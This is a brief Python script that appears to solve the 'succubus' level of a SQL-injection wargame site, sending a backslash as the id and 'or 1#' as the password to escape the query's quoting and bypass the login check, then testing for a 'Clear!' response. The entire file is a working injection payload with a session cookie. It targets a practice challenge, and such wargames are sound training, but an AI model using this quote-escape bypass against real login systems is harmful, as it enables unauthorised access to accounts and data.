import requests

url = "https://los.rubiya.kr/chall/succubus_37568a99f12e6bd2f097e8038f74d768.php"
cookie = {"PHPSESSID" : "tibb2rs3ofa7rjdogjml4vbvd6"}
params = {"id" : "\\", "pw":"or 1#"}

if requests.get(url, params, cookies=cookie).text.find("Clear!") > 0:print("[*] Success")
